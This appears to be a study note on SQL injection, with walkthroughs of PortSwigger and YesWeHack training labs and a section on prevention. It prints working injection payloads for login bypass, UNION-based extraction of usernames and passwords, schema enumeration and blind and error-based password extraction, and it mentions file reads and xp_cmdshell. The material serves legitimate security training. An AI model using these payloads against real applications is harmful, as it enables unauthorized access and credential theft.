# SQL Injection 

## Overview

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when user-supplied data is insecurely included in a database query.

- **Core Vulnerability**: Mixing user **data** with database query **code**.
    
- **Classic Example**: Bypassing a login form.
    
    - **Input**: `admin' OR '1'='1' --`
        
    - **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...';`
        
    - **Effect**: The `WHERE` clause becomes true for all users, and the password check is ignored (`--` is a comment), allowing a login bypass.

---

## Detection Methods

Methods for discovering SQLi vulnerabilities from the outside.

### Error-Based SQLi

- **Concept**: Provoking the database to return an error message by injecting special characters (`'`, `"`, `--`).
    
- **Indicator**: The application returns a verbose database error (e.g., `"You have an error in your SQL syntax..."`). This confirms the vulnerability and often reveals the database type.

### Blind SQLi

Used when no errors are returned. The attacker infers information based on the application's behavior.

- **Boolean-Based Blind SQLi**:
    
    - **Concept**: Asking the database a series of True/False questions and observing a change in the page content.
        
    - **Example**:
        
        - `... AND '1'='1'` → Page loads normally (True).
            
        - `... AND '1'='2'` → Page returns "not found" or changes (False).
            
    - **Result**: The difference in response acts as a "yes/no" signal.
        
- **Time-Based Blind SQLi**:
    
    - **Concept**: Forcing the database to "sleep" or "wait" for a specified time if a condition is true.
        
    - **Example**: `... AND IF(1=1, SLEEP(5), 0)`
        
    - **Result**: If the page takes 5 seconds longer to load, the condition is true. This is a last resort as it is very slow and noisy.

!!! alert "SQL Injection points"

	Most SQL injection exists in the `WHERE` clause of the `SELECT` statement; however...
	
	Some other common locations where SQL injection arises are:
	
	- In `UPDATE` statements, within the updated values or the `WHERE` clause.
	- In `INSERT` statements, within the inserted values.
	- In `SELECT` statements, within the table or column name.
	- In `SELECT` statements, within the `ORDER BY` clause.

!!! warning "Caution using `OR 1=1`"

	Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

??? example "PortSwigger SQL Injection Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"

	**Instructions**
	
	To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
	
	**Exploit**
	
	On this shopping site, we can filter by category. For example, when "accessories" is selected, only three items are shown. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803065121.png)
	
	The following request and response show this:
	
	```
	GET /filter?category=Accessories HTTP/1.1
	Host: 0a8000b80463b54380fff8a8001500cc.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Connection: keep-alive
	Referer: https://0a8000b80463b54380fff8a8001500cc.web-security-academy.net/filter?category=Tech+gifts
	Cookie: session=xcf9s6nU2m49EDeOXGJhsUF1dYJzO1uK
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1
	X-PwnFox-Color: magenta
	Priority: u=0, i
	
	
	```
	
	
	```
	HTTP/1.1 200 OK
	Content-Type: text/html; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 4789
	
	[...SNIP...]
	```
	
	Note the content length of 4789. When a single quote character is added, the server complains. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803065507.png)
	
	Notice that if we add a second single quote, the applications calms down again and doesn't return an internal error. To view unreleased items, I used the following string:
	
	```
	' AND 1=1-- -
	```
	
	This shows the awesome and unreleased six-pack beer belt, which is a fantastic idea...btw!
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803070133.png)
	
	Note that the official solution uses `OR 1=1-- -`, but this seemed to have worked for me. 

??? example "PortSwigger SQL Injection Lab 2: SQL injection vulnerability allowing login bypass"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the login function.
	
	To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
	
	Trying to log in as the administrator with a random password predictably fails.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250804063257.png)
	
	Closing out the quotes and adding a comment before the password parameter allows us to bypass the authentication mechanism and we can log in as the administrator to solve the lab. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250804063545.png)
	


---

## Exploitation Techniques

Abusing the vulnerability

### `UNION`-Based SQLi

**Concept**: The `UNION` operator combines the results of the application's legitimate query with the results of a malicious query crafted by the attacker.
    
**Process**:
    
1. **Find Column Count**: Determine the number of columns in the original query using `ORDER BY n--` or `UNION SELECT NULL,NULL,...--`.

	!!! tip "Null"
	
		Using "NULL" is a good idea because it is convertible to every common data type, so we can use it to figure out columns without having to fight with the database about data types. In some cases, this may cause an error like a NullPointerException, which could make this method ineffective. 
	
2. **Extract Data**: Craft a `UNION SELECT` statement to pull data from other tables.
        
**Example Payload**: `' UNION SELECT username, password FROM users--`

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
	- Figure out how many columns there are.
- The data types in each column must be compatible between the individual queries.
	- Which columns returned from the original query are of a suitable data type to host the payload?

??? example "PortSwigger SQLi Lab 3: SQL injection UNION attack, determining the number of columns returned by the query"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
	
	To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
	
	The lab looks like this...with filtering options. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250804065416.png)
	
	Each row has a "View details" button which brings up the article, as shown below.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250804065607.png)
	
	Adding a single quote in the category field causes an internal server error, and adding a second fixes the error, so that seems like a good place to start. 
	
	```
	' UNION SELECT null-- -
	```
	
	After a little bit of poking, we find that the table has 3 columns. The following payload worked to solve the lab:
	
	```
	' UNION SELECT null,null,null-- - 
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250804070112.png)

!!! tip "Tip for Oracle databases"

	With Oracle databases, every SELECT statement must use a FROM clause and specify the database. We can use the built-in `dual` database for this. The query would look like this:
	
	```
	' UNION SELECT NULL FROM DUAL--
	```

??? example "PortSwigger SQL Injection Lab 4: SQL injection UNION attack, finding a column containing text"

	This lab is very similar to the previous one, but instead of just needing to determine the right number of columns in a table, now we need to figure out which one of those columns contains text. 
	
	The start of the lab is the same. After a little bit of testing, we figure out there are three columns, as shown below:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250805072620.png)
	
	```
	' UNION SELECT null,null,null-- -
	```
	
	Now we just need to test each of those columns with the data type we're looking for. Since we're trying to find the one that contains text, I just used `'a'` and looked for what DIDN'T cause an error. 
	
	Here, we can see that the second column works. 
	
	```
	Gifts' UNION SELECT null,'a',null-- -
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250805072825.png)
	
	Now we just need to replace the `'a'` with whatever string the lab wants to print. In this case, it was `CtqSX7`. So I just dropped that in place of the `'a'` and solved the lab. 
	


??? example "PortSwigger Lab 5: SQL injection UNION attack, retrieving data from other tables"

	**Instructions**
	
	This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
	
	The database contains a different table called `users`, with columns called `username` and `password`.
	
	To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
	
	**Exploit**
	
	Given the hint the lab provides, we can start with this payload:
	
	```
	' UNION SELECT username,password from users-- -
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250806072416.png)
	
	That works, now we can just log in as the administrator to solve the lab.

	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250806073140.png)

It's also possible to extract multiple values in a single column with string concatenation. See the [PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/retrieving-multiple-values-within-a-single-column)

??? example "PortSwigger SQL Injection Lab 6: SQL injection UNION attack, retrieving multiple values in a single column"

	!!! info "Lab instructions"
	
		This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
		
		The database contains a different table called `users`, with columns called `username` and `password`.
		
		To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
	
	We can start this one the same way as the other labs; first, figure out how many columns there are (2), and then figure out which column supports text. I'm using the second column. To figure out what database is in use, I used the `version()` command, and found that the DB was Postgres, as shown below.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807203420.png)
	
	According to the PortSwigger SQLi cheatsheet, the string concatenation operator in Postgres is `||`. 
	
	So since we know (they gave us the hint) that there is a table named `users` containing columns `username` and `password`, we can extract those with something like `username||'~'||password`.
	
	That worked, and we got the administrator password. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807203938.png)
	
	Now we can just log in as the administrator to solve the lab.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807204020.png)
	

### Identifying the Database

It's probably pretty helpful to know what kind of database you're hacking on, so we'll probably need to figure that out.

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
??? example "PortSwigger SQL Injection Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft"

	!!! info "Lab Instructions"
	
		This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
		
		To solve the lab, display the database version string.
	
	This is the same style of app...basically a eCommerce site. The required string is shown at the top of the page:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807204725.png)
	
	Start the same way... number of columns > which one supports the correct data type > submit payload > profit. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807205020.png)
	
	After we send the `@@version` string in the second column, we force the DB to print the correct string (its version information) and we solve the lab. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250807205112.png)
	

### Information Schema

It's possible to extract information about the database from the Information Schema in most databases (except Oracle).

??? example "PortSwigger SQL Injection Lab 8: SQL injection attack, listing the database contents on non-Oracle databases"

	!!! info "Lab Instructions"
	
		This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
		
		The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
		
		To solve the lab, log in as the `administrator` user.
	
	Same sort of eCommerce site here as before. 
	
	Since the point off this lab is to extract information from the information schema, I'm going to try this payload first: `' UNION SELECT null,schema_name from information_schema.schemata-- -`
	
	After sending that, we get the following output:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250808065135.png)
	
	I probably could have narrowed that down a bit by appending `where schema_name='pg_catalog'`, but oh well. Now we need to enumerate the tables. We can use `' UNION SELECT null,table_name from information_schema.tables-- -` to do that.
	
	Getting the user table
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250808065528.png)
	
	So now we can enumerate columns from that table. 
	
	Sending `' UNION SELECT null,column_name from information_schema.columns where table_name='users_ihlozl'-- -` gives the following results:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250808065954.png)
	
	Now that we have the column names we can start trying to extract some data. I used the following query to get the usernames and passwords: `' UNION SELECT null,username_ewecsv || ' ' || password_ikgqwk FROM users_ybsfde-- -`.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250808183852.png)
	
	Aaaaand...done.


## Blind SQLi

Blind SQLi exists when the application is vulnerable to SQL injection, but we (as the attacker) don't see any responses. Typically this means we'll have to infer the response by triggering certain error responses, time delays, or by finding some kind of oracle to determine the truth of our statements.

??? example "PortSwigger SQL Injection Lab 9: Lab: Blind SQL injection with conditional responses"

	!!! info "Lab Instructions"
	
		This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
		
		The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
		
		The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
		
		To solve the lab, log in as the `administrator` user
	
	Blind SQLi is an area that has never made a ton of sense to me, so I need to spend a bit of extra time on these. 
	
	**Attempting to confirm**
	
	We can use `' AND 1=1-- -` to try to confirm the vulnerability:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250810180308.png)
	
	Now if we use 1=2, we SHOULD get a different result:
	
	Sure enough, we get no "Welcome back" message
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250810180439.png)
	
	So now we've confirmed that there is a SQL injection vulnerability in the tracking cookie.
	
	Now we can start trying to figure out how long the administrator's password is. 
	
	!!! alert "Skipping a step"
	
		Note that the official solution uses a step to confirm the existence of the `administrator` user. Since we're given that in the lab instructions, I didn't do that step, but the command they used was:
		
		```
		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
		```
		
	To determine how long the password is, we can use a conditional leveraging the `>` symbol...basically, the condition is true if the password is longer than N.
	
	```
	' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
	```
	
	Although it's certainly possible, it's probably unlikely that this password is longer than 30 characters, so I'm starting with that as the top end.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250811182643.png)
	
	Note the change in content-length between 19 and 20. 
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250811182836.png)
	
	Since making the argument that the password is greater than 19 characters returns the "Welcome back!" message (implying true), but the argument "> 20" doesn't return the welcome back message (implying false) we can infer that the password is 20 characters long. 
	
	Now that we know how long the password is, we can start trying to figure out what characters belong where. 
	
	Using the following payload we can start enumerating the individual characters.
	
	```
	' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='7')='a
	```
	
	Note the different content length with `7`. Looking at the response we see we get the "Welcome back!" message, so we can conclude that the first character of the password is "7". Now we need to automate this a bit to get the rest of the password. 
	
	I ran a matrix scan and found the following password:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250811190304.png)
	
	Administrator password:
	
	```
	7f6u7x9cqygoeigltueb
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250811190429.png)
	
	Done. 

### Error-based SQLi

This refers to cases where it's possible to use error messages to either view or infer sensitive data. 
- We might be able to induce the application to return a specific error in response to a boolean expression...basically making this like the previous example. 
- In some cases, it might be possible to trigger error messages that contain the output of our query. This basically turns a blind SQLi into a visible one.

#### Exploiting blind SQLi by triggering conditional errors

Some applications' behavior doesn't change when they perform SQL queries; however, it may be possible to get them to return different response based on if a SQL error occurs. 

The following statements illustrate this:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

We can use this same technique to extract information just like we did in the previous step.

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

So in this case, when the condition is true, we should see a divide-by-zero error of some sort. 

??? example "PortSwigger SQL Injection Lab 10: Blind SQL injection with conditional errors"

	!!! info "Lab Instructions"
	
		This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
		
		The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
		
		The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
		
		To solve the lab, log in as the `administrator` user.
		These attacks depend on excessive database user privileges.
	
		!!! alert "Hint"
			We're also given a hint that this is an Oracle database.
	
	This lab is similar to the previous ones where the application is using a tracking cookie that we can inject into. 
	
	Using the following payload confirms that a) the database is Oracle, and b) the application is SQL injectable. 
	
	```
	'||(SELECT '' FROM dual)||'
	```
	
	We can use the following payload from the PortSwigger SQLi cheatsheet to test this a bit more:
	
	```
	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
	```
	
	So the query looks like this:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250812195354.png)
	
	Note the error message when using 1=1. This is because since the 1=1 statement always evaluates to true, the `1/0` gets evaluated which causes a divide by zero error. The 1=2 statement evaluates to false, so the `1/0` does NOT get evaluated, so we don't get an error.
	
	To figure out how many characters the password has, we can use the following payload:
	
	```
	'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
	```
	
	Then we can use automate/intruder to make this a bit quicker.
	
	Note the error is triggered at payload 20...meaning that "password > 20" is false (since it returns a 200 -- no error). So we know the Administrator's password is 20 characters long.
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250812202453.png)
	
	Now we can start trying to figure out the password. I'm using the following payload for that:
	
	```
	'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
	```
	
	After running it through intruder, the password is there (just not presented nicely like Caido does)
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250812203653.png)
	
	Administrator password
	
	```
	zhm0aveqcwd1q2rzcxnq
	```
	
	Log in as the administrator to solve the lab. 

It may also be possible to extract data through generating errors that contain information returned from the SQL query. 

##### Cast

It may be possible to trigger such an error by trying to cast the result of the query (probably a string) to an incompatible data type like an integer. 

```
CAST((SELECT example_column FROM example_table) AS int)
```

??? example "PortSwigger SQL Injection Lab: Visible error-based SQL injection"

	!!! info "Lab Instructions"
	
		This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
		
		The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.
	
	In this lab, we find that errors are returned, so we can see the output. Note the error returned from the following payload:
	
	```
	' AND CAST((SELECT 1) AS int)--
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250813054527.png)
	
	We can just set that to evaluate to `1=1` as follows:
	
	```
	' AND 1=CAST((SELECT 1) AS int)--
	```
	
	Now we get a 200 OK. Now...we need to figure out how to get data out of this. 
	
	Send the following payload, and note that the output ("administrator") is shown in the error message.
	
	```
	x' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250813055211.png)
	
	Cool...now we can start trying to extract some more valuable information. 
	
	Using the same general principle that we used to extract the first username, we can also extract the first password as follows:
	
	```
	x' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
	```
	
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250813055810.png)
	
	Now we can log in as the administrator and complete the lab. 



- **File System Access**: Using database functions like `LOAD_FILE()` to read sensitive files from the server (e.g., `/etc/passwd`).
    
- **Remote Code Execution (RCE)**: Using database features like `xp_cmdshell` (MS-SQL) or user-defined functions to execute operating system commands on the server.
    

---

## Prevention Methods

### Parameterized Queries

- **Also known as**: Prepared Statements.
    
- **Concept**: This method strictly separates the SQL query logic from the user-supplied data. The query structure is sent and compiled first, then the data is sent separately and safely bound to the query.
    
- **Why it works**: User input is **always treated as data, never as executable code**. The `' OR '1'='1'` payload fails because the database literally looks for a value with that string, which doesn't exist.
    

### Defense-in-Depth Strategy

Using multiple layers of security.

1. **Input Validation**: Check if user input is in the expected format (e.g., is it an integer?) before processing it. Use **allow-listing** (only accepting known-good formats).
    
2. **Principle of Least Privilege**: The application's database account should only have the absolute minimum permissions needed to function. This limits the damage if an injection occurs.
    
3. **Web Application Firewall (WAF)**: A device or service that inspects traffic and blocks requests that match known-bad attack signatures. A good layer, but not a substitute for secure code.

---

## Advanced Topics

### Second-Order SQLi
A two-step attack where a malicious payload is first safely stored in the database, only to be executed later when a different, vulnerable function retrieves and uses that data insecurely.

### Out-of-Band (OOB) SQLi
An exfiltration method where the attacker forces the database to make an external network request (e.g., DNS or HTTP) to a server they control, sending data within that request.

### Automation (SQLMap)
A powerful open-source tool that automates the entire process of detecting, exploiting, and exfiltrating data via SQL injection.


--- 
## Other Labs

??? example "YesWeHack Dojo - SQL Injection"

	**Lab 1 - Simple Login Bypass**
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803122836.png)
	
	Payload:
	
	```
	pass' or '1'='1
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803123043.png)
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803123055.png)
	
	**Lab 2: First Exfiltration**
	
	This level has a hint as follows 
	
	"`UNION` can be used to combine the results from different queries."
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803134156.png)
	
	Sending "admin" gives us the email address for the admin user:
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803134253.png)
	
	Now we can try using a `UNION` to extract the password.
	
	This took a little bit of tinkering, but I eventually got the following payload working:
	
	```
	admin%' UNION SELECT null,password FROM users WHERE email LIKE '%admin%'-- -
	```
	
	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803134858.png)
	
